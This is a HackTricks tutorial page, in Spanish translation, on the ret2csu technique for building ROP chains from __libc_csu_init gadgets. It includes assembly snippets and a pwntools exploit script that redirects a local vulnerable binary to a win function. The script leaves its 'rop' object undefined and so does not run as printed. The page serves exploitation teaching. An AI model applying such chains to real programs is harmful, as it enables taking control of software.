# Ret2csu

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**ret2csu** es una t칠cnica de hacking utilizada cuando intentas tomar control de un programa pero no puedes encontrar los **gadgets** que normalmente usas para manipular el comportamiento del programa.&#x20;

Cuando un programa utiliza ciertas bibliotecas (como libc), tiene algunas funciones integradas para gestionar c칩mo diferentes partes del programa se comunican entre s칤. Entre estas funciones hay algunas joyas ocultas que pueden actuar como nuestros gadgets faltantes, especialmente una llamada `__libc_csu_init`.

### The Magic Gadgets in \_\_libc\_csu\_init

En `__libc_csu_init`, hay dos secuencias de instrucciones (nuestros "gadgets m치gicos") que destacan:

1. La primera secuencia nos permite configurar valores en varios registros (rbx, rbp, r12, r13, r14, r15). Estos son como espacios donde podemos almacenar n칰meros o direcciones que queremos usar m치s tarde.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Este gadget nos permite controlar estos registros al sacar valores de la pila y colocarlos en ellos.

2. La segunda secuencia utiliza los valores que configuramos para hacer un par de cosas:
* **Mover valores espec칤ficos a otros registros**, prepar치ndolos para que los usemos como par치metros en funciones.
* **Realizar una llamada a una ubicaci칩n** determinada al sumar los valores en r15 y rbx, y luego multiplicar rbx por 8.
```
mov rdx, r14;
mov rsi, r13;
mov edi, r12d;
call qword [r15 + rbx*8];
```
## Ejemplo

Imagina que quieres hacer una syscall o llamar a una funci칩n como `write()` pero necesitas valores espec칤ficos en los registros `rdx` y `rsi` como par치metros. Normalmente, buscar칤as gadgets que configuren estos registros directamente, pero no puedes encontrar ninguno.

Aqu칤 es donde **ret2csu** entra en juego:

1. **Configurar los Registros**: Usa el primer gadget m치gico para sacar valores de la pila y colocarlos en rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) y r15.
2. **Usar el Segundo Gadget**: Con esos registros configurados, usas el segundo gadget. Esto te permite mover tus valores elegidos a `rdx` y `rsi` (desde r14 y r13, respectivamente), preparando los par치metros para una llamada a funci칩n. Adem치s, al controlar `r15` y `rbx`, puedes hacer que el programa llame a una funci칩n ubicada en la direcci칩n que calculas y colocas en `[r15 + rbx*8]`.

Tienes un [**ejemplo usando esta t칠cnica y explic치ndolo aqu칤**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), y este es el exploit final que utiliz칩:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Nota que el exploit anterior no est치 destinado a hacer un **`RCE`**, solo est치 destinado a llamar a una funci칩n llamada `win` (tomando la direcci칩n de `win` de stdin llamando a gets en la cadena ROP y almacen치ndola en r15) con un tercer argumento con el valor `0xdeadbeefcafed00d`.
{% endhint %}

### 쯇or qu칠 no usar libc directamente?

Usualmente, estos casos tambi칠n son vulnerables a [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), pero a veces necesitas controlar m치s par치metros de los que se pueden controlar f치cilmente con los gadgets que encuentras directamente en libc. Por ejemplo, la funci칩n `write()` requiere tres par치metros, y **encontrar gadgets para establecer todos estos directamente puede no ser posible**.

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
